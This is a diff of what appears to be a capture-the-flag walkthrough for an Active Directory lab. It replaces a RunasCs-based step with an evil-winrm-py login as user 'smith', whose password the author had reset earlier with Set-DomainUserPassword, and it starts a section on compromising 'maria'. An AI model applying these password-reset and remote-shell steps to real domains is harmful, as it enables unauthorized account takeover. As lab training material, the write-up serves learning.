@@ -305,18 +305,20 @@ evil-winrm-py PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smit
 Ill change the users password
 
 ```python
-evil-winrm-py PS C:\Users\oliver\Desktop> upload RunasCs.exe .
+evil-winrm-py -i 10.129.62.43 -u smith -p 'Password123!' 
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to '10.129.62.43:5985' as 'smith'
+evil-winrm-py PS C:\Users\smith\Documents>
 ```
 
-Ill upload runascs
+I can now authenticate as this user to WINRM
 
-```python
-evil-winrm-py PS C:\Users\oliver\Desktop> .\RunasCs.exe smith Password123! 'whoami'
-[*] Warning: The logon for user 'smith' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+# Compromising `maria`
 
-object\smith
-evil-winrm-py PS C:\Users\oliver\Desktop>
-```
 
-I can now execute commands as this user
 
